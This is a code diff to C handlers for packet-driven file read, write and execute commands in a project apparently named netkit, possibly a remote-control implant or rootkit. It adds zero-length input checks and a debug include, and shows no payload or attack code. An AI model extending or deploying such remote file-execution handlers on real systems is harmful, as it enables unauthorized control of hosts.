@@ -15,6 +15,7 @@
 #include "../../sys/file.h"
 #include "../../sys/symbol.h"
 #include "../../sys/task.h"
+#include "../../sys/debug.h"
 #include "../../netkit.h"
 
 int cmd_handle_file_read(const struct packet_req *packet, u8 **res_buf, size_t *res_buflen)
@@ -22,6 +23,9 @@ int cmd_handle_file_read(const struct packet_req *packet, u8 **res_buf, size_t *
     size_t filename_len;
     char *filename;
     int retv;
+
+    if (packet->content_len == 0)
+        return -EINVAL;
 
     // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
     filename_len = packet->content_len + 1;
@@ -45,6 +49,9 @@ int cmd_handle_file_write(const struct packet_req *packet, u8 **res_buf, size_t 
     char *filename;
     size_t content_len;
     int retv;
+
+    if (packet->content_len == 0)
+        return -EINVAL;
 
     // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
     filename_len = strnlen(packet->content, packet->content_len) + 1;
@@ -72,6 +79,9 @@ int cmd_handle_file_exec(const struct packet_req *packet, u8 **res_buf, size_t *
     size_t filename_len;
     char *filename;
     int retv;
+
+    if (packet->content_len == 0)
+        return -EINVAL;
 
     // mitigate vuln when no nb and packet->content_len = CHUNK_SIZE
     filename_len = packet->content_len + 1;
